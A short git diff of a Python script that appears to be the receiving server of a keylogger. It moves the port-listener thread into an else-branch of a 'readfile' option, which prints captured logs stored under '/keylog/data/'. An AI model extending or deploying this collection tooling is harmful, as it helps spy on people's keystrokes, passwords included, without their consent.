@@ -81,27 +81,28 @@ if __name__ == '__main__':
 
     argument = argument()
 
-    if argument.listen:
-
-        port = argument.listen
-    else:
-        port = PORT
-
-    receiver_t = threading.Thread(target=receiver, args=(port,))
-
-    receiver_t.start()
-
     if argument.readfile:
         path = '/keylog/data/'
         fics = glob.glob(os.path.join(path, '*'))
-
         #client_address = server_socket.getpeername()
         #ficname = f"{client_address[0]}-{datetime.date.today()}.txt"
-
         for fic in fics :
             with open(fic, "r") as f:
                 file = f.read()
                 print(file)
+    else :
+        
+        if argument.listen:
+
+            port = argument.listen
+        else:
+            port = PORT
+
+        receiver_t = threading.Thread(target=receiver, args=(port,))
+
+        receiver_t.start()
+
+
 
     # commands_t = threading.Thread(target=commands)
 
